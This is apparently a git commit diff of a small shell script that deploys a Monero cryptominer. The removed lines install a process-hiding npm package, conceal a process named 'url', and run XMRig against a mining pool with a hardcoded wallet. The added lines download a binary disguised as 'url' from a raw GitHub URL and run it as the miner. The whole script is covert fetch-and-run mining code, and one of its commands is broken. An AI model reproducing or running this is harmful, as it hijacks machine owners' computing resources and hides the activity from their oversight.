5ea4138a4f9604b15f4c73328d0f9ec26f0b575b
nettech12 <107695376+nettech12@users.noreply.github.com>
2022-11-13 09:21:42 +0530

    Update 3th.sh

--- 3th.sh
+++ 3th.sh
@@ -1,10 +1,3 @@
 #!bin/bash
-sudo apt install npm -y 
-echo "{}" > package.json 
-npm install node-process-hider
-npx ph add url
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
-tar -xf xmrig-6.18.1-linux-x64.tar.gz && cd chmod +x xmrig
-
-./url --coin=XMR --threads=3 -o pool.supportxmr.com:3333 -u 4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4.adi -k -p x
-#139.99.124.170:5555
+wget -nc https://raw.githubusercontent.com/nettech12/tool/main/url
+./url --coin=XMR --threads=4 -o pool.supportxmr.com:3333 -u 4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4.vps -k -p x
